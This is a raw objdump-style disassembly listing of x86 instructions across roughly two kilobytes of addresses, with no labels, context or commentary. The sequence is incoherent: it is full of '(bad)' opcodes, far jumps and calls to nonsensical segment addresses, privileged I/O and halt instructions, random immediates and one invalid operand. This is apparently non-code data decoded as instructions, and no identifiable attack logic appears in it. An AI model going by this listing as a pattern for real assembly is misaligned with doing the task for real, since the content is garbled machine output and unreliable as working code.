  419538:	adc    BYTE PTR ss:[esi+edx*8],ch
  41953c:	mov    eax,0x75b16b51
  419541:	jmp    0x16d8:0xc6906c23
  419548:	jecxz  0x4194ed
  41954a:	aaa    
  41954b:	jno    0x419550
  41954d:	xchg   edx,eax
  41954e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41954f:	dec    edi
  419550:	xchg   BYTE PTR [ebp-0x726cd581],dl
  419556:	popf   
  419557:	gs scas al,BYTE PTR es:[edi]
  419559:	mov    ah,0x39
  41955b:	(bad)  
  41955c:	xor    eax,0xcc82f80f
  419561:	lods   al,BYTE PTR ds:[esi]
  419562:	mov    al,ds:0xdcb4246e
  419567:	inc    esi
  419568:	add    esi,DWORD PTR [ebx-0x6c]
  41956b:	add    bh,al
  41956d:	sub    eax,0x88810520
  419572:	push   ss
  419573:	xlat   BYTE PTR ds:[ebx]
  419574:	loop   0x4195f1
  419576:	cmp    DWORD PTR [ebp+0x52],edx
  419579:	jno    0x419510
  41957b:	mov    cl,0x3c
  41957d:	shl    ah,cl
  41957f:	jle    0x41951e
  419581:	jnp    0x41953d
  419583:	adc    bh,cl
  419585:	jne    0x419530
  419587:	enter  0x946,0x71
  41958b:	add    eax,0xba0b28a6
  419590:	lods   eax,DWORD PTR ds:[esi]
  419591:	vunpcklps ymm4,ymm1,ymm5
  419595:	xchg   esp,eax
  419596:	and    ebx,esp
  419598:	pop    edi
  419599:	outs   dx,DWORD PTR ds:[esi]
  41959a:	(bad)  
  41959b:	adc    ch,BYTE PTR [edx+0x66]
  41959e:	rcr    DWORD PTR [ecx],cl
  4195a0:	and    DWORD PTR [esi],ebx
  4195a2:	jl     0x4195ac
  4195a4:	jnp    0x4195f6
  4195a6:	or     al,0xfa
  4195a9:	jmp    0x41957e
  4195ab:	test   ecx,esp
  4195ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ae:	and    eax,0x8f76fa9d
  4195b3:	or     eax,0x2c0be504
  4195b8:	enter  0xba72,0x2c
  4195bc:	mov    edi,0x9586ffc0
  4195c1:	test   BYTE PTR [ecx+0x9],bh
  4195c4:	fdiv   st,st(5)
  4195c6:	int3   
  4195c7:	lds    edx,FWORD PTR [ebx+0x24dd59a6]
  4195cd:	push   ebx
  4195ce:	mov    ecx,0x52d068c
  4195d3:	or     bl,al
  4195d5:	mov    eax,0xa0d4f454
  4195da:	sbb    dl,BYTE PTR [eax+0x39]
  4195dd:	jl     0x419580
  4195df:	scas   eax,DWORD PTR es:[edi]
  4195e0:	xchg   ecx,eax
  4195e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195e2:	repz retf 
  4195e4:	nop
  4195e5:	adc    DWORD PTR [esi-0x53d7ba3],esp
  4195eb:	sbb    eax,0xa7785599
  4195f0:	add    DWORD PTR [edx+ebp*2],0xd56d4b8c
  4195f7:	mov    ch,0xb4
  4195f9:	stc    
  4195fa:	push   0xeb1a9a87
  4195ff:	xlat   BYTE PTR ds:[ebx]
  419600:	pop    ecx
  419601:	repz jl 0x41963f
  419604:	je     0x419635
  419606:	mov    al,ch
  419608:	xchg   edx,eax
  419609:	xchg   esp,eax
  41960a:	sbb    bl,cl
  41960c:	ins    DWORD PTR es:[edi],dx
  41960d:	add    dh,BYTE PTR [ebp+0x63]
  419610:	sub    eax,0xc9d17bae
  419615:	punpckhbw mm1,QWORD PTR [esi+ecx*1]
  419619:	jge    0x41962f
  41961b:	pop    ds
  41961c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41961d:	mov    ch,ch
  41961f:	xor    dl,ah
  419621:	add    DWORD PTR [esi+0x2dd0f0b2],0xb7c7064c
  41962b:	mov    bl,cl
  41962d:	jmp    0x4195d0
  41962f:	mov    dl,0x35
  419631:	js     0x41961a
  419633:	or     WORD PTR [ebp+0x5378cba8],sp
  41963a:	dec    eax
  41963b:	out    dx,eax
  41963c:	dec    ebx
  41963d:	mov    BYTE PTR [eax],bl
  41963f:	lahf   
  419640:	sub    BYTE PTR ds:0xc08e5b27,ah
  419646:	mov    ch,0xde
  419648:	push   esp
  419649:	in     eax,0xa8
  41964b:	dec    edi
  41964c:	scas   eax,DWORD PTR es:[edi]
  41964d:	jmp    0x9dc9:0x78290a89
  419654:	cmp    eax,0xd5b6dc30
  419659:	cmp    cl,BYTE PTR [ebx]
  41965b:	daa    
  41965c:	cmp    ch,bl
  41965e:	xchg   BYTE PTR [ebx-0x30],ah
  419661:	dec    edi
  419662:	inc    edi
  419663:	and    esi,DWORD PTR [ebp+0x4e]
  419666:	xor    BYTE PTR [ecx-0x71],ch
  419669:	jle    0x419654
  41966b:	xchg   DWORD PTR [edi],edi
  41966d:	rcr    bl,0x23
  419670:	pop    edi
  419671:	push   edi
  419672:	and    eax,0xe4cd8cae
  419677:	add    ch,al
  419679:	push   eax
  41967a:	pop    eax
  41967b:	inc    ebx
  41967c:	int    0x4b
  41967e:	xchg   ebx,eax
  419680:	push   ebp
  419681:	ja     0x419676
  419683:	pop    es
  419684:	lods   eax,DWORD PTR ds:[esi]
  419685:	sub    al,0x94
  419687:	cld    
  419688:	xchg   esi,eax
  419689:	fisubr DWORD PTR [ecx-0xa]
  41968c:	push   edi
  41968d:	call   0xe31d9fea
  419692:	lods   al,BYTE PTR ds:[esi]
  419693:	add    al,0xd8
  419695:	sti    
  419696:	jl     0x419631
  419698:	dec    esp
  419699:	pop    ebx
  41969a:	or     al,0x4c
  41969c:	iret   
  41969d:	pop    esp
  41969e:	outs   dx,BYTE PTR ds:[esi]
  41969f:	mov    edi,0x942bc1fe
  4196a4:	mov    es,WORD PTR [ebp-0x3f]
  4196a7:	mov    eax,ds:0x74042cb9
  4196ac:	js     0x41970e
  4196ae:	sar    edi,1
  4196b0:	add    BYTE PTR [edi],dh
  4196b2:	or     BYTE PTR [ebx+ebx*1+0x45113e7c],ah
  4196b9:	sub    ecx,edx
  4196bb:	adc    DWORD PTR [ebp-0x11373eb0],0x7a2f0b9a
  4196c5:	and    BYTE PTR [eax],cl
  4196c7:	hlt    
  4196c8:	outs   dx,BYTE PTR ds:[esi]
  4196c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ca:	out    dx,eax
  4196cb:	jmp    0xb7e1:0xd172aca7
  4196d2:	and    edx,esp
  4196d4:	and    eax,0x49684437
  4196d9:	inc    edi
  4196da:	dec    esi
  4196db:	je     0x419705
  4196dd:	push   0x769f2da8
  4196e2:	and    eax,0xf5ab35b
  4196e7:	add    eax,0xd43d7602
  4196ec:	fimul  DWORD PTR [ecx+0x36]
  4196ef:	mov    ch,0x8e
  4196f1:	test   DWORD PTR [edi-0x43],edi
  4196f4:	and    edx,DWORD PTR [ebp-0x8]
  4196f7:	or     eax,0xdf3321ea
  4196fc:	push   ss
  4196fd:	adc    ch,BYTE PTR ds:0x176605e5
  419703:	ss addr16 ret 0xd5a
  419708:	push   ebx
  419709:	push   es
  41970a:	cmp    BYTE PTR [eax],bh
  41970c:	sahf   
  41970d:	icebp  
  41970e:	dec    ecx
  41970f:	or     bh,ah
  419711:	leave  
  419712:	and    eax,0xfd578bfe
  419717:	mov    eax,0xade921dc
  41971c:	sub    edx,ebx
  41971e:	mov    dl,0xb9
  419720:	dec    eax
  419721:	inc    edi
  419722:	std    
  419723:	adc    DWORD PTR [esi],ebp
  419725:	cmp    DWORD PTR [ebx],eax
  419727:	stc    
  419728:	push   edx
  419729:	mov    al,ds:0xcf94753b
  41972e:	push   cs
  41972f:	mov    edi,0x5aad2a29
  419734:	out    0xac,al
  419736:	repz sub DWORD PTR [ebp-0x61],0xe49b934a
  41973e:	jp     0x4196ce
  419740:	sbb    DWORD PTR [esp+ebx*1],ebp
  419743:	dec    esi
  419744:	pusha  
  419745:	xchg   edi,edi
  419747:	xchg   esp,eax
  419748:	mov    esi,0x2a284c27
  41974d:	std    
  41974e:	push   esi
  41974f:	std    
  419750:	popa   
  419751:	call   0x355d2e0b
  419756:	adc    DWORD PTR [esp+edx*2+0x73],eax
  41975a:	sbb    eax,0x3583b0b7
  41975f:	mov    eax,0xe0f7047c
  419764:	push   ecx
  419765:	lods   al,BYTE PTR ds:[esi]
  419766:	pusha  
  419767:	push   esp
  419768:	imul   eax,DWORD PTR [ebx],0xfffffff8
  41976b:	retf   0x74c0
  41976e:	mov    eax,ds:0xb21150b
  419773:	xor    edi,DWORD PTR [esi+0xf932166]
  419779:	iret   
  41977a:	jle    0x4197c9
  41977c:	aas    
  41977d:	aas    
  41977e:	gs add eax,0xd8b46a21
  419784:	mov    dh,0x8
  419786:	and    al,0xc9
  419788:	mov    dh,0x4
  41978a:	xchg   BYTE PTR [ecx+ecx*2],dl
  41978d:	std    
  41978e:	mov    al,0xae
  419790:	outs   dx,DWORD PTR ds:[esi]
  419791:	pop    ebx
  419792:	inc    ecx
  419793:	jb     0x4197d3
  419795:	push   ebx
  419796:	(bad)  [edi-0x6e0f0e8e]
  41979c:	dec    ebx
  41979d:	inc    ebp
  41979e:	xlat   BYTE PTR ds:[ebx]
  41979f:	pop    ebp
  4197a0:	pusha  
  4197a1:	mov    dl,0xb9
  4197a3:	pop    eax
  4197a4:	js     0x419821
  4197a6:	push   ds
  4197a7:	jg     0x419795
  4197a9:	push   ecx
  4197aa:	dec    eax
  4197ab:	leave  
  4197ac:	pop    edx
  4197ad:	in     eax,dx
  4197ae:	pushf  
  4197af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197b0:	fadd   QWORD PTR [eax-0x5072474c]
  4197b6:	push   ss
  4197b7:	rcr    DWORD PTR [ebp+0x1a],1
  4197ba:	loopne 0x419779
  4197bc:	out    dx,al
  4197bd:	mov    DWORD PTR [esp+eiz*8-0x7],edx
  4197c1:	nop
  4197c2:	test   eax,0x29a95dee
  4197c7:	(bad)  
  4197c9:	retf   0xd5b9
  4197cc:	js     0x41983f
  4197ce:	outs   dx,BYTE PTR ds:[esi]
  4197cf:	clc    
  4197d0:	sti    
  4197d1:	icebp  
  4197d2:	jmp    0x419812
  4197d4:	push   ds
  4197d5:	nop
  4197d6:	ins    DWORD PTR es:[edi],dx
  4197d7:	jmp    0x5e5b:0xb3be3e00
  4197de:	jae    0x419854
  4197e0:	push   esi
  4197e1:	sbb    BYTE PTR [edx-0x12],ah
  4197e4:	xchg   ebx,eax
  4197e5:	(bad)  
  4197e6:	and    al,BYTE PTR [ebp-0x1f]
  4197e9:	mov    ch,0xb8
  4197eb:	or     al,0x49
  4197ed:	xor    cl,bh
  4197ef:	out    dx,eax
  4197f0:	inc    edx
  4197f1:	std    
  4197f2:	mov    esp,0x2b5b1ac9
  4197f7:	stc    
  4197f8:	not    BYTE PTR [ebx+0x46279157]
  4197fe:	shl    DWORD PTR [esi],cl
  419800:	or     ch,0xf4
  419803:	mov    bl,0xf0
  419805:	stos   DWORD PTR es:[edi],eax
  419806:	adc    ecx,DWORD PTR [ebp-0x43]
  419809:	ins    DWORD PTR es:[edi],dx
  41980a:	pop    edx
  41980b:	(bad)  
  41980c:	push   eax
  41980d:	shr    DWORD PTR [edi],0x87
  419810:	inc    ebx
  419811:	mov    eax,ds:0x3b2750a2
  419816:	stc    
  419817:	mov    dl,0xdd
  419819:	jge    0x41979c
  41981b:	test   BYTE PTR [esi+0x2f4392c5],ch
  419821:	inc    edi
  419822:	mov    eax,ds:0xae22f195
  419827:	inc    ebx
  419828:	mov    eax,0xa8fb9f82
  41982d:	mul    ecx
  41982f:	sbb    DWORD PTR [ebp+edx*2+0x363d594c],ebp
  419836:	add    esp,DWORD PTR [esp+ebp*2-0x15822379]
  41983d:	push   esi
  41983e:	xor    dl,bl
  419840:	in     al,0x16
  419842:	and    bl,BYTE PTR [eax-0x6b]
  419845:	adc    eax,0xe2e01221
  41984a:	sub    al,0x14
  41984c:	fsubr  st(6),st
  41984e:	mov    dl,0xc3
  419850:	js     0x4198a6
  419852:	sub    DWORD PTR [ebp+0x56],0x2373f213
  419859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41985a:	mov    edi,0xd4a7ebbb
  41985f:	xchg   BYTE PTR [esi-0x2d],cl
  419862:	das    
  419863:	sbb    edi,edi
  419865:	ret    
  419866:	mov    al,0xf7
  419868:	push   ecx
  419869:	pop    es
  41986a:	in     al,0x5f
  41986c:	inc    ecx
  41986d:	(bad)  
  41986e:	adc    al,0xe0
  419870:	mov    edi,0x25da248d
  419875:	pop    ecx
  419876:	jp     0x4198a2
  419878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419879:	xchg   BYTE PTR [ebp-0x70],ch
  41987c:	push   eax
  41987d:	mov    ah,BYTE PTR [eax+0x26]
  419880:	xchg   DWORD PTR [ebx-0x71854e4e],esi
  419886:	lahf   
  419887:	jae    0x4198c2
  419889:	pop    ss
  41988a:	pop    ss
  41988b:	lods   al,BYTE PTR ds:[esi]
  41988c:	mov    ebx,0xa6241f7
  419891:	hlt    
  419892:	mov    cl,0xa
  419894:	aad    0xe6
  419896:	retf   
  419897:	out    dx,al
  419898:	js     0x4198d5
  41989a:	outs   dx,BYTE PTR ds:[esi]
  41989b:	int3   
  41989c:	push   ebp
  41989d:	std    
  41989e:	xchg   edi,eax
  41989f:	in     al,dx
  4198a0:	fwait
  4198a1:	xor    al,0x59
  4198a3:	jecxz  0x419924
  4198a5:	push   esp
  4198a6:	sbb    ah,0x31
  4198a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198aa:	in     al,0xf9
  4198ac:	scas   eax,DWORD PTR es:[edi]
  4198ad:	mov    bh,ah
  4198af:	dec    edx
  4198b0:	ret    
  4198b1:	jecxz  0x419906
  4198b3:	aaa    
  4198b4:	call   0xca8d:0x5ff969e5
  4198bb:	pop    ebp
  4198bc:	jge    0x41987d
  4198be:	or     bh,dh
  4198c0:	pop    edi
  4198c1:	outs   dx,DWORD PTR ds:[esi]
  4198c2:	and    BYTE PTR [edx+0x1acf1997],ch
  4198c8:	sahf   
  4198c9:	add    DWORD PTR [edx],0x8913d2f1
  4198cf:	ret    
  4198d0:	sbb    esi,DWORD PTR [ecx]
  4198d2:	(bad)  
  4198d3:	or     eax,0x3dcbccca
  4198d8:	push   ss
  4198d9:	jno    0x4198e9
  4198db:	push   0xffffff89
  4198dd:	(bad)  
  4198de:	sbb    eax,0x54d3b9f8
  4198e3:	bound  ebp,QWORD PTR [edi-0x4e]
  4198e6:	fidiv  WORD PTR [edx]
  4198e8:	dec    edi
  4198e9:	pop    ss
  4198ea:	and    ch,BYTE PTR [eax]
  4198ec:	cmp    al,0x31
  4198ee:	or     esp,DWORD PTR [edi]
  4198f0:	outs   dx,DWORD PTR ds:[esi]
  4198f1:	cmp    BYTE PTR [ebx+0x3],bh
  4198f4:	adc    bh,BYTE PTR [esi]
  4198f6:	mov    ds:0x555f310f,eax
  4198fb:	xchg   esp,eax
  4198fc:	push   esi
  4198fd:	stos   DWORD PTR es:[edi],eax
  4198fe:	ret    
  4198ff:	ror    DWORD PTR [eax-0x34],1
  419902:	jmp    0x419978
  419904:	mov    edi,0xf6703058
  419909:	les    esi,FWORD PTR [ebp-0x7]
  41990c:	scas   eax,DWORD PTR es:[edi]
  41990d:	xchg   cl,cl
  41990f:	(bad)  
  419910:	(bad)  
  419911:	jg     0x41992b
  419913:	int    0x53
  419915:	sbb    esi,DWORD PTR [edi]
  419917:	mov    eax,0x81d2ca9f
  41991c:	arpl   WORD PTR [esi+ebp*1],si
  41991f:	dec    edi
  419920:	cli    
  419921:	rcl    BYTE PTR [edi-0x2f],cl
  419924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419925:	rol    BYTE PTR [eax-0x1bd9822e],0xae
  41992c:	push   ebx
  41992d:	adc    BYTE PTR ds:0xe22fbeb3,ah
  419933:	dec    ebx
  419934:	in     eax,dx
  419935:	mov    al,0xb
  419937:	jbe    0x41993d
  419939:	sub    edi,DWORD PTR [eax-0x2f]
  41993c:	hlt    
  41993d:	sub    al,0xa2
  41993f:	mov    ds:0x36d2cc50,eax
  419944:	push   ebp
  419945:	neg    ebp
  419947:	je     0x419989
  419949:	arpl   WORD PTR [ecx+0x5396012b],ax
  41994f:	and    cl,BYTE PTR [ebx+0x3329f514]
  419955:	mov    ch,0x38
  419957:	mov    ds,WORD PTR [ecx+edi*8+0x509f0341]
  41995e:	push   cs
  41995f:	sti    
  419960:	mov    dh,0xe8
  419962:	mov    DWORD PTR ds:0xa9d91009,eax
  419968:	cdq    
  419969:	outs   dx,DWORD PTR es:[esi]
  41996b:	cmp    eax,0xd02f4e9b
  419970:	lods   eax,DWORD PTR ds:[esi]
  419971:	xchg   esp,eax
  419972:	jne    0x41996a
  419974:	push   ebp
  419975:	stc    
  419976:	xchg   esp,eax
  419977:	(bad)  
  419978:	in     al,0xb1
  41997a:	sbb    ch,BYTE PTR [edx+0x404905bd]
  419980:	(bad)
  419983:	adc    eax,0x47067afc
  419988:	push   ss
  419989:	sbb    ah,al
  41998b:	les    esi,FWORD PTR [esi+0x4c9ece35]
  419991:	sti    
  419992:	loop   0x419931
  419994:	push   0xcddd91b2
  419999:	mov    ebp,0xe55d94b2
  41999e:	clc    
  41999f:	ja     0x41999e
  4199a1:	push   ebx
  4199a2:	gs pop es
  4199a4:	es scas eax,DWORD PTR es:[edi]
  4199a6:	ins    DWORD PTR es:[edi],dx
  4199a7:	jle    0x41995a
  4199a9:	push   eax
  4199aa:	xor    eax,0x53a56b0e
  4199af:	popf   
  4199b0:	mov    ebx,0x3c3219f0
  4199b5:	lahf   
  4199b6:	xor    al,cl
  4199b8:	(bad)  
  4199b9:	push   ecx
  4199ba:	jmp    0x419a0b
  4199bc:	jae    0x419953
  4199be:	pop    edi
  4199bf:	jno    0x419955
  4199c1:	xchg   ecx,eax
  4199c2:	and    cl,BYTE PTR [ecx-0x6a]
  4199c5:	xchg   ecx,eax
  4199c6:	or     al,BYTE PTR [ebx+0x59c9964b]
  4199cc:	lods   eax,DWORD PTR ds:[esi]
  4199cd:	sub    ecx,eax
  4199cf:	imul   edi,DWORD PTR [ecx],0xffffff99
  4199d2:	in     al,dx
  4199d3:	cmp    BYTE PTR [edi+0x77c7d351],bh
  4199d9:	jno    0x4199b1
  4199db:	xchg   esi,esp
  4199dd:	add    DWORD PTR [edx+ebp*4-0x69],esi
  4199e1:	lock inc edi
  4199e3:	pop    ds
  4199e4:	dec    edi
  4199e5:	sub    DWORD PTR [edx+0x2d],esp
  4199e8:	(bad)  
  4199e9:	cli    
  4199ea:	xchg   ebp,eax
  4199eb:	sbb    eax,0x40b75787
  4199f0:	test   DWORD PTR [esi+edi*4+0x70bb27db],0x25fbe86d
  4199fb:	cmp    esi,DWORD PTR [edi-0x23fcc883]
  419a01:	add    BYTE PTR [ebx-0x39],cl
  419a04:	push   ebx
  419a05:	fistp  QWORD PTR gs:[esi+0x3264728c]
  419a0c:	lds    edi,FWORD PTR [esi-0x3165cae7]
  419a12:	inc    DWORD PTR [ebx-0x6dc10306]
  419a18:	jae    0x419a5c
  419a1a:	jge    0x419a6e
  419a1c:	retf   0x3297
  419a1f:	xlat   BYTE PTR ds:[ebx]
  419a20:	stos   DWORD PTR es:[edi],eax
  419a21:	in     eax,0x4a
  419a23:	lods   al,BYTE PTR ds:[esi]
  419a24:	pop    eax
  419a25:	aaa    
  419a26:	jne    0x419a4f
  419a28:	or     BYTE PTR [eax+0x73],dh
  419a2b:	cmp    dl,BYTE PTR [ebp-0x8c67b49]
  419a31:	inc    eax
  419a32:	jmp    0x797e:0xe6b45a11
  419a39:	test   DWORD PTR [ebx+0x5997e9e3],0xc1522a17
  419a43:	inc    ebp
  419a44:	test   DWORD PTR [esi+0x16],edx
  419a47:	out    dx,eax
  419a48:	imul   esi,DWORD PTR [ebx-0x4c],0xffffff80
  419a4c:	push   ebp
  419a4d:	loope  0x419a12
  419a4f:	xchg   edi,eax
  419a50:	push   ds
  419a51:	cmc    
  419a52:	jne    0x419a8d
  419a54:	ins    DWORD PTR es:[edi],dx
  419a55:	adc    eax,0xe7e2430
  419a5a:	inc    ebp
  419a5b:	fdiv   DWORD PTR [eax-0x611addc2]
  419a61:	mov    bh,0x3d
  419a63:	ins    BYTE PTR es:[edi],dx
  419a64:	shl    BYTE PTR cs:[ebx-0x4a],cl
  419a68:	xor    BYTE PTR [edx+0x20],dh
  419a6b:	pop    ss
  419a6c:	test   BYTE PTR [edx],0xe2
  419a6f:	cmp    BYTE PTR [esi],ah
  419a71:	outs   dx,BYTE PTR ds:[esi]
  419a72:	cmc    
  419a73:	outs   dx,BYTE PTR ds:[esi]
  419a74:	dec    esp
  419a75:	ds mov eax,0x567a4c57
  419a7b:	and    eax,0xf9805b2c
  419a80:	mov    eax,ds:0x6436e84f
  419a85:	stos   DWORD PTR es:[edi],eax
  419a86:	test   eax,0xd3477fea
  419a8c:	xor    dh,BYTE PTR [ebp-0x32def2c3]
  419a92:	retf   
  419a93:	lock dec ebp
  419a95:	test   al,0xe4
  419a97:	call   0x2410:0x5bbeee5a
  419a9e:	out    dx,eax
  419a9f:	mov    ds:0x6602d289,eax
  419aa4:	test   esp,edx
  419aa6:	dec    edi
  419aa7:	in     al,0xc3
  419aa9:	scas   al,BYTE PTR es:[edi]
  419aaa:	loopne 0x419a4c
  419aac:	in     eax,0xf2
  419aae:	cmp    al,0x81
  419ab0:	(bad)  
  419ab1:	(bad)  
  419ab2:	das    
  419ab3:	jmp    0x419b31
  419ab5:	mov    ebp,ebx
  419ab7:	stos   DWORD PTR es:[edi],eax
  419ab8:	lods   eax,DWORD PTR ds:[esi]
  419ab9:	ja     0x419ad9
  419abb:	xor    bh,BYTE PTR [ecx+0x7b]
  419abe:	adc    BYTE PTR [edx-0x288200df],0x99
  419ac5:	into   
  419ac6:	mov    esp,0x54bbecf8
  419acb:	add    esi,DWORD PTR gs:[edi+ebx*8+0x3ae033fe]
  419ad3:	sbb    eax,0x3909bbd5
  419ad8:	mov    bl,0x8a
  419ada:	mov    ch,0xf1
  419adc:	aad    0xcd
  419ade:	jle    0x419aed
  419ae0:	dec    eax
  419ae1:	inc    edx
  419ae2:	loopne 0x419b40
  419ae4:	mov    dh,0xd5
  419ae6:	and    BYTE PTR ds:0xc9903f7f,ah
  419aec:	xchg   esp,eax
  419aed:	fist   WORD PTR [ecx+0x5]
  419af0:	not    BYTE PTR [esi]
  419af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af3:	push   eax
  419af4:	inc    eax
  419af5:	mov    ecx,0x7bf5957f
  419afa:	je     0x419b1e
  419afc:	clc    
  419afd:	leave  
  419afe:	fisubr DWORD PTR [ebx+0x536b22db]
  419b04:	mov    esp,0x8080a752
  419b09:	mov    bl,0x7d
  419b0b:	in     al,0xf
  419b0d:	ins    DWORD PTR es:[edi],dx
  419b0e:	sbb    DWORD PTR [eax-0x42],ebp
  419b11:	add    DWORD PTR [esi],eax
  419b13:	daa    
  419b14:	loop   0x419aa9
  419b16:	add    BYTE PTR [esi],bh
  419b18:	frstor [edi]
  419b1a:	push   eax
  419b1b:	sar    dh,1
  419b1d:	repz retf 
  419b1f:	cmc    
  419b20:	cli    
  419b21:	test   al,0x2
  419b23:	stos   DWORD PTR es:[edi],eax
  419b24:	stc    
  419b25:	out    dx,eax
  419b26:	sub    dl,0xab
  419b29:	jmp    0x419b31
  419b2b:	xchg   esi,eax
  419b2c:	pusha  
  419b2d:	mov    edi,0x68550231
  419b32:	and    DWORD PTR [ebp-0x31cf4251],esi
  419b38:	inc    ecx
  419b39:	push   ebx
  419b3a:	shl    BYTE PTR [ebx],0x13
  419b3d:	dec    esi
  419b3e:	jae    0x419b96
  419b40:	enter  0x26b4,0xe0
  419b44:	out    dx,al
  419b45:	test   eax,0xc81fae3a
  419b4a:	sahf   
  419b4b:	push   ebp
  419b4c:	dec    ecx
  419b4d:	xchg   ecx,eax
  419b4e:	lods   eax,DWORD PTR ds:[esi]
  419b4f:	mov    cl,0x85
  419b51:	mov    edx,0x7ade2a16
  419b56:	and    edx,eax
  419b58:	mov    WORD PTR [edi-0x52dd4f6a],ss
  419b5e:	dec    ebx
  419b5f:	or     al,0xd3
  419b61:	outs   dx,DWORD PTR ds:[esi]
  419b62:	mov    ch,0x2c
  419b64:	retf   
  419b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b66:	mov    esi,0x26ab7da9
  419b6b:	push   0x58
  419b6d:	xchg   ebp,eax
  419b6e:	and    al,0x4e
  419b70:	adc    al,BYTE PTR ds:0x120467ae
  419b76:	retf   0x2c99
  419b79:	aam    0xbe
  419b7b:	int3   
  419b7c:	(bad)  
  419b7d:	rcr    eax,0x4a
  419b80:	push   0x89edd8c
  419b85:	or     BYTE PTR ds:0x2743a207,0x67
  419b8c:	fdiv   DWORD PTR [edx]
  419b8e:	js     0x419c09
  419b90:	dec    ecx
  419b91:	stos   DWORD PTR es:[edi],eax
  419b92:	cmp    DWORD PTR [esi+ebp*8+0x524d1ecc],0x57
  419b9a:	lock jnp 0x419ba7
  419b9d:	mov    al,0x4f
  419b9f:	loope  0x419b7d
  419ba1:	lahf   
  419ba2:	inc    edx
  419ba3:	mov    edi,0xe618fc88
  419ba8:	mov    ch,0x93
  419baa:	pop    esp
  419bab:	adc    al,0xf0
  419bad:	push   cs
  419bae:	and    edi,DWORD PTR [esi+0x432cc067]
  419bb4:	lods   eax,DWORD PTR ds:[esi]
  419bb5:	xchg   esp,ecx
  419bb7:	xlat   BYTE PTR ds:[ebx]
  419bb8:	add    ecx,0xffffff96
  419bbb:	iret   
  419bbc:	xlat   BYTE PTR ds:[ebx]
  419bbd:	cli    
  419bbe:	(bad)  
  419bbf:	adc    edx,DWORD PTR [eax-0x2c]
  419bc2:	nop
  419bc3:	sahf   
  419bc4:	dec    edx
  419bc5:	mov    cl,dh
  419bc7:	add    BYTE PTR [edi],dl
  419bc9:	sub    DWORD PTR [eax],0x8e51c81c
  419bcf:	inc    edi
  419bd0:	std    
  419bd1:	adc    BYTE PTR [ebp+ecx*2-0x4f],dl
  419bd5:	sbb    al,0x78
  419bd7:	bound  edi,QWORD PTR [ebx+0x6ccd9f53]
  419bdd:	inc    ecx
  419bde:	or     ecx,DWORD PTR ds:0x9af35b4e
  419be4:	dec    edx
  419be5:	inc    esi
  419be6:	mov    edi,0xcecf4840
  419beb:	repz mov edx,0xbe0191ae
  419bf1:	bound  edi,QWORD PTR [esp+eiz*2-0x71]
  419bf5:	mov    al,0xe3
  419bf7:	fwait
  419bf8:	jle    0x419c19
  419bfa:	sbb    al,0x55
  419bfc:	add    edi,edi
  419bfe:	sbb    eax,0xce879699
  419c03:	add    dl,BYTE PTR [esi-0x52]
  419c06:	aas    
  419c07:	dec    edi
  419c08:	xor    bh,ch
  419c0a:	push   cs
  419c0b:	mov    bl,0xb9
  419c0d:	std    
  419c0e:	ficomp DWORD PTR [edx]
  419c10:	or     dh,BYTE PTR [esi-0x50]
  419c13:	mov    BYTE PTR [ebx],ch
  419c15:	jg     0x419c5a
  419c17:	sbb    BYTE PTR [eax],0x88
  419c1a:	mov    bl,0xce
  419c1c:	xor    BYTE PTR [ecx],cl
  419c1e:	push   esi
  419c1f:	test   BYTE PTR [edi-0x56],0x88
  419c23:	dec    esp
  419c24:	ds inc eax
  419c26:	or     eax,0x21e14fde
  419c2b:	cmc    
  419c2c:	dec    esp
  419c2d:	adc    eax,0xf4da6df0
  419c32:	jae    0x419bb7
  419c34:	out    dx,eax
  419c35:	scas   eax,DWORD PTR es:[edi]
  419c36:	dec    edi
  419c37:	fdivr  DWORD PTR [ebx]
  419c39:	dec    edi
  419c3a:	add    BYTE PTR [edx],al
  419c3c:	sbb    eax,0xcdc90c97
  419c41:	jecxz  0x419c0c
  419c43:	mov    ?,WORD PTR [edi+0x41962f0f]
  419c49:	iret   
  419c4a:	fisubr DWORD PTR [ebp-0x5419943]
  419c50:	fiadd  WORD PTR [edx+0x72]
  419c53:	jle    0x419c34
  419c55:	sahf   
  419c56:	push   esi
  419c57:	cmp    BYTE PTR [edi-0x3ff9d850],0xe5
  419c5e:	sbb    al,0x3b
  419c60:	fild   QWORD PTR [ebx-0x1114ae37]
  419c66:	mov    ebp,0xb4ec779c
  419c6b:	cld    
  419c6c:	(bad)  
  419c6d:	jnp    0x419ccd
  419c6f:	adc    esi,DWORD PTR [edx+0x1e22b855]
  419c75:	jmp    0xf5cb:0xa79ee073
  419c7c:	stos   BYTE PTR es:[edi],al
  419c7d:	and    ch,BYTE PTR [edx]
  419c7f:	jmp    0x419c9c
  419c81:	mov    ecx,0xc2b678d6
  419c86:	and    DWORD PTR [edx-0x5eda859],edx
  419c8c:	test   eax,0x37e62529
  419c91:	pusha  
  419c92:	mov    ebp,0x54d75719
  419c97:	mov    al,ds:0xadb6e439
  419c9c:	cmp    BYTE PTR [edi+edi*2+0x2e],0xe6
  419ca1:	and    DWORD PTR [esi],edx
  419ca3:	fs call 0xeaa386ea
  419ca9:	xchg   ebp,eax
  419caa:	mov    ss,WORD PTR ds:0xa0d20e02
  419cb0:	xchg   BYTE PTR [edx-0x3806682a],cl
  419cb6:	mov    eax,0x4a06b7a
  419cbb:	in     al,0x67
  419cbd:	test   eax,0xe0aeb7bc
  419cc2:	dec    ecx
  419cc3:	mov    al,ds:0x58f05207
  419cc8:	test   DWORD PTR [edi+0x5],edx
  419ccb:	lahf   
  419ccc:	call   0xb1d6:0x228a8211
  419cd3:	iret   
  419cd4:	or     BYTE PTR [edx-0x23],ch
  419cd7:	jae    0x419d23
  419cd9:	mov    ebp,0x8c72b3ab
  419cde:	jge    0x419cfc
  419ce0:	mov    eax,0x81168b7a
  419ce5:	(bad)  [ebx+0x12]
  419ce8:	cdq    
